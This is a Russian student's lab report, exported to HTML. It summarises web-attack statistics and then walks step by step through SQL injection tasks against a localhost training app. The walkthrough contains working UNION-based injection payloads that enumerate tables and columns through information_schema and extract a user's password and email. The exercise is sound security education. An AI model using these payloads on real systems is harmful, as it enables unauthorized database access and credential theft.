@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>&Lcy;&acy;&bcy;&ocy;&rcy;&acy;&tcy;&ocy;&rcy;&ncy;&acy;&yacy; &rcy;&acy;&bcy;&ocy;&tcy;&acy; &numero;1</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <h1 id="лабораторная-работа-1">Лабораторная работа №1</h1>
+<h2 id="часть-1">Часть 1</h2>
+<h1 id="1-источники">1) Источники</h1>
+<p>Bizone (2024):<br>
+<a href="https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/">https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/</a></p>
+<p>Security Boulevard / Verizon DBIR(2020):<br>
+<a href="https://securityboulevard.com/2020/05/43-of-data-breaches-connected-to-application-vulnerabilities-assessing-the-appsec-implications/">https://securityboulevard.com/2020/05/43-of-data-breaches-connected-to-application-vulnerabilities-assessing-the-appsec-implications/</a></p>
+<p>Aioncloud / AIWAF (2025):<br>
+<a href="https://www.aioncloud.com/2026-01-web-attack-trend-report/">https://www.aioncloud.com/2026-01-web-attack-trend-report/</a></p>
+<h1 id="2">2)</h1>
+<p>По данным статьи Verizon DBIR(2020) <em><strong>43% случаев утечки данных</strong></em> были связаны с веб-приложениями.</p>
+<h1 id="3">3)</h1>
+<h1 id="по-данным-aiwaf-за-2025-год"><strong>По данным AIWAF за 2025 год</strong></h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Тип уязвимости</th>
+<th style="text-align:left">Доля от общего числа обнаружений (%)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SQL Injection (SQL-инъекция)</td>
+<td style="text-align:left">33.93</td>
+</tr>
+<tr>
+<td style="text-align:left">Application Vulnerability (Уязвимости приложений)</td>
+<td style="text-align:left">12.78</td>
+</tr>
+<tr>
+<td style="text-align:left">Default Page (Страницы по умолчанию)</td>
+<td style="text-align:left">12.29</td>
+</tr>
+<tr>
+<td style="text-align:left">System File Access (Доступ к системным файлам)</td>
+<td style="text-align:left">12.07</td>
+</tr>
+<tr>
+<td style="text-align:left">Bad User-Agent (Некорректные / вредоносные User-Agent)</td>
+<td style="text-align:left">9.7</td>
+</tr>
+</tbody>
+</table>
+<h1 id="по-данным-bizone-за-2024-год"><strong>По данным Bizone за 2024 год</strong></h1>
+<p>Распределение атак по типам уязвимостей</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Тип атаки</th>
+<th style="text-align:left">Доля</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Remote Code Execution (RCE)</td>
+<td style="text-align:left"><strong>36%</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">Атаки на кражу данных (XSS и др.)</td>
+<td style="text-align:left"><strong>14%</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">SQL-инъекции</td>
+<td style="text-align:left"><strong>10%</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">Path traversal и доступ к файлам</td>
+<td style="text-align:left"><strong>16%</strong></td>
+</tr>
+</tbody>
+</table>
+<h1 id="доля-атак-по-отраслям-по-данным-bizone2024"><em><strong>Доля атак по отраслям по данным Bizone(2024)</strong></em></h1>
+<h3 id="31-rce-атаки-36-от-всех-веб-атак">3.1 RCE-атаки (36% от всех веб-атак)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Отрасль</th>
+<th style="text-align:left">Доля RCE-атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Медицина</td>
+<td style="text-align:left">53%</td>
+</tr>
+<tr>
+<td style="text-align:left">Строительство</td>
+<td style="text-align:left">47%</td>
+</tr>
+<tr>
+<td style="text-align:left">IT, ритейл, туризм</td>
+<td style="text-align:left">выше среднего (36%)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="32-разведывательные-атаки">3.2 Разведывательные атаки</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Отрасль</th>
+<th style="text-align:left">Доля разведывательных атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Медиа</td>
+<td style="text-align:left">54%</td>
+</tr>
+<tr>
+<td style="text-align:left">Промышленность</td>
+<td style="text-align:left">47%</td>
+</tr>
+<tr>
+<td style="text-align:left">Финансы и страхование</td>
+<td style="text-align:left">31%</td>
+</tr>
+</tbody>
+</table>
+<h3 id="33-path-traversal--доступ-к-файлам-16">3.3 Path Traversal / доступ к файлам (16%)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Отрасль</th>
+<th style="text-align:left">Доля атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Транспорт и логистика</td>
+<td style="text-align:left">73%</td>
+</tr>
+<tr>
+<td style="text-align:left">Энергетический сектор</td>
+<td style="text-align:left">42%</td>
+</tr>
+<tr>
+<td style="text-align:left">Юридические, консалтинговые, рекламные и прочие профессиональные услуги</td>
+<td style="text-align:left">38%</td>
+</tr>
+</tbody>
+</table>
+<h3 id="34-xss--кража-данных-14">3.4 XSS / кража данных (14%)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Отрасль</th>
+<th style="text-align:left">Доля атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Государственные организации</td>
+<td style="text-align:left">66%</td>
+</tr>
+<tr>
+<td style="text-align:left">Телекоммуникационные компании</td>
+<td style="text-align:left">37%</td>
+</tr>
+<tr>
+<td style="text-align:left">Образовательные учреждения</td>
+<td style="text-align:left">30%</td>
+</tr>
+</tbody>
+</table>
+<h3 id="35-sql-инъекции-10">3.5 SQL-инъекции (10%)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Отрасль</th>
+<th style="text-align:left">Доля атак</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Ритейл</td>
+<td style="text-align:left">26%</td>
+</tr>
+<tr>
+<td style="text-align:left">Финансовый сектор</td>
+<td style="text-align:left">11%</td>
+</tr>
+</tbody>
+</table>
+<h2 id="часть-2">Часть 2</h2>
+<h3 id="задание-1">Задание 1</h3>
+<p>Ход моих рассуждений:</p>
+<blockquote>
+<p>SQL-инъекции это когда вместо параметров типа логина и пароля вставляется sql код, на сервере при составлении запроса к бд производится соединение строк и (если нет проверки на то, что sql кода не должно быть в данных, которые пришли от пользователя) вместо адекватного логина и пароля вставляется код, и ответом от сервера, например, может прийти весь список пользователей</p>
+<p>Я читала, что вставляют вот такие символы( ' или -- ), чтобы строку закрыть и оставшийся код закомментировать</p>
+<p>Надо что-то похожее попробовать сделать<br>
+Но сначала просто хотя бы тыкнуть с запрос с login = Volk2<br>
+<a href="http://localhost:8080/task/login=Volk2">http://localhost:8080/task/login=Volk2</a><br>
+В ответе Not Found, ожидаемо. Может просто Volk2 написать?</p>
+<p><a href="http://localhost:8080/task/Volk2">http://localhost:8080/task/Volk2</a><br>
+Not Found<br>
+Ладно, пора открывать статью.<br>
+Кажется, стоит сразу sql запрос написать, что-то типа<br>
+<code>SELECT * FROM users WHERE username = 'Volk2' --'</code><br>
+Чтобы закомментировать все что после<br>
+Чтобы было похоже на то, что в статье<br>
+<code>SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'</code></p>
+<p><a href="http://localhost:8080/task/SELECT%20*%20FROM%20users%20WHERE%20username%20=%20'Volk2'%20--">http://localhost:8080/task/SELECT * FROM users WHERE username = 'Volk2' --</a>'<br>
+Not Found<br>
+Надо написать что-то типа id=любое и --'<br>
+А еще я погуглила и параметры пишутся через ?</p>
+<p><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a><br>
+Ну тут уже что-то хоть вывелось<br>
+Ваш id:1<br>
+Ваш логин:admin</p>
+<p><a href="http://localhost:8080/task/?nickname='Volk2'">http://localhost:8080/task/?nickname='Volk2'</a><br>
+Введите в качестве параметра ваш id<br>
+Судя по всему надо узнать id волка2</p>
+<p><a href="http://localhost:8080/task/?id=2">http://localhost:8080/task/?id=2</a>
+Ваш id:2<br>
+Ваш логин:Volk<br>
+Так ну это первый волк</p>
+<p><a href="http://localhost:8080/task/?id=9">http://localhost:8080/task/?id=9</a><br>
+Ваш id:9<br>
+Ваш логин:Volk2<br>
+Нехитрым перебором хотя бы id узнали<br>
+Надо теперь как-то из бд вытащить пароль где у пользователя id = 9</p>
+<p><a href="http://localhost:8080/task/?login='Volk2'">http://localhost:8080/task/?login='Volk2'</a><br>
+Если так то снова id требуют<br>
+Видимо все делаем через id</p>
+<p><a href="http://localhost:8080/task/?id='--">http://localhost:8080/task/?id='--</a><br>
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' LIMIT 0,1' at line 1<br>
+Интересный ответ, но судя по всему в качестве СУБД сервер использует MySQL и уязвимость в виде sql инъекции присутствует<br>
+Так ну запрос выглядит что-то типа
+<code>query = &quot;SELECT id, login FROM users WHERE id='&quot; + id + &quot;'&quot;</code><br>
+Надо написать что-то типа id = 9 UNION SELECT login, password FROM users</p>
+<p><a href="http://localhost:8080/task/?id=9%20UNION%20SELECT%20login,%20password%20FROM%20users">http://localhost:8080/task/?id=9 UNION SELECT login, password FROM users</a><br>
+Ваш id:9<br>
+Ваш логин:Volk2<br>
+Ничего не изменилось, судя по предыдущим запросам там лимит стоит надо просто сделать так чтобы не вернул ничего первый селект, а еще там есть ковычки у id</p>
+<p><a href="http://localhost:8080/task/?id=-1">http://localhost:8080/task/?id=-1</a> вот на такое пусто<br>
+То что надо</p>
+<p><a href="http://localhost:8080/task/?id=-1%20UNION%20SELECT%20id,%20password%20FROM%20users%20WHERE%20id%20=%209">http://localhost:8080/task/?id=-1 UNION SELECT id, password FROM users WHERE id = 9</a><br>
+На такое тоже пусто</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,%20password%20FROM%20users%20WHERE%20id%20=%209">http://localhost:8080/task/?id=-1' UNION SELECT id, password FROM users WHERE id = 9</a><br>
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' LIMIT 0,1' at line 1<br>
+Уже ошибка уже не пусто</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,password%20FROM%20users%20WHERE%20id=9%20--%20">http://localhost:8080/task/?id=-1' UNION SELECT id,password FROM users WHERE id=9 -- </a><br>
+The used SELECT statements have a different number of columns<br>
+Победа, это новая ошибка<br>
+давайте просто пароль тогда попросим</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20password%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1' union select password from users where id=9 -- </a><br>
+The used SELECT statements have a different number of columns<br>
+Значит давайте все попросим</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20*%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1' union select * from users where id=9 -- </a><br>
+Ваш id:9<br>
+Ваш логин:Volk2<br>
+ага просим то мы все а отображается только то что надо, что делать то?</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,login,password%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1' union select id,login,password from users where id=9 -- </a><br>
+Unknown column 'login' in 'field list'<br>
+Логина нет</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1' union select id,username,password from users where id=9 -- </a><br>
+а вот username есть и судя по всему 3 столбца</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20">http://localhost:8080/task/?id=-1' union select password,id,username from users where id=9 -- </a><br>
+Поменяли местами, теперь вместо id пароль вместо логина(username) id</p>
+<p>Ваш id:Wa spoiuuuuu<br>
+Ваш логин:9</p>
+<p>Это победа, коллеги.</p>
+<p><strong>ОТВЕТ: Wa spoiuuuuu</strong></p>
+</blockquote>
+<hr>
+<h3 id="задание-2">Задание 2</h3>
+<blockquote>
+<p>Когда я перебирала id, на id=4 Винни пух нашелся<br>
+<a href="http://localhost:8080/task/?id=4">http://localhost:8080/task/?id=4</a><br>
+Ваш id:4<br>
+Ваш логин:Vinni-pukh<br>
+Попробуем аналогично предыдущему заданию</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20users%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1' union select email,id,username from users where id=4 -- </a><br>
+Unknown column 'email' in 'field list'<br>
+Столбца email нет</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20mail,id,username%20from%20users%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1' union select mail,id,username from users where id=4 -- </a><br>
+Unknown column 'mail' in 'field list'<br>
+Mail тоже нет</p>
+<p>а если в users немного информации а в user полная и там есть email<br>
+<a href="http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20user%20where%20id=4%20--">http://localhost:8080/task/?id=-1' union select email,id,username from user where id=4 --</a><br>
+Table 'security.user' doesn't exist<br>
+Новая ошибка, но судя по всему user нет, а если USER?</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20email,id,username%20from%20USER%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1' union select email,id,username from USER where id=4 -- </a><br>
+Table 'security.USER' doesn't exist<br>
+Такой тоже нет<br>
+А можно как-то узнать какие есть?</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20table_name,1,2%20FROM%20information_schema.tables%20--%20">http://localhost:8080/task/?id=-1' UNION SELECT table_name,1,2 FROM information_schema.tables -- </a><br>
+Ваш id:CHARACTER_SETS<br>
+Ваш логин:1<br>
+Что-то в этом есть</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20">http://localhost:8080/task/?id=-1' UNION SELECT GROUP_CONCAT(table_name),1,2 FROM information_schema.tables WHERE table_schema=database() -- </a><br>
+Ваш id:emails,users<br>
+Ваш логин:1<br>
+Супер, есть всего две базы, и вторая с почтами</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20email,%201,%202%20from%20emails%20where%20user_id=4%20--%20">http://localhost:8080/task/?id=-1' union select email, 1, 2 from emails where user_id=4 -- </a><br>
+Unknown column 'email' in 'field list'<br>
+такого столбца нет</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%200,%201,%202%20from%20emails%20where%20user_id=4%20--%20">http://localhost:8080/task/?id=-1' union select 0, 1, 2 from emails where user_id=4 -- </a><br>
+Unknown column 'user_id' in 'where clause'<br>
+такого тоже кстати нет<br>
+Надо видимо снова понять какие столбцы в принципе есть и желательно одним запросом</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(column_name),1,2%20FROM%20information_schema.columns%20WHERE%20table_name='emails'%20--%20">http://localhost:8080/task/?id=-1' UNION SELECT GROUP_CONCAT(column_name),1,2 FROM information_schema.columns WHERE table_name='emails' -- </a><br>
+Ваш id:id,email_id<br>
+Ваш логин:1<br>
+столбца 2 но каких-то странных, id это id записи или юзера? Наверное юзера но я бы так не делала бд</p>
+<p><a href="http://localhost:8080/task/?id=-1%27%20union%20select%20email_id,%201,%202%20from%20emails%20where%20id=4%20--%20">http://localhost:8080/task/?id=-1' union select email_id, 1, 2 from emails where id=4 -- </a><br>
+Ваш <a href="mailto:id:honey_lover@otus-lab.com">id:honey_lover@otus-lab.com</a><br>
+Ваш логин:1<br>
+Ну это явно почта Винни пуха</p>
+<p>Все таки id это id юзера, а email_id это почта(?!!)</p>
+<p><em><strong>ОТВЕТ: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></strong></em></p>
+</blockquote>
+
+            
+            
+        </body>
+        </html>
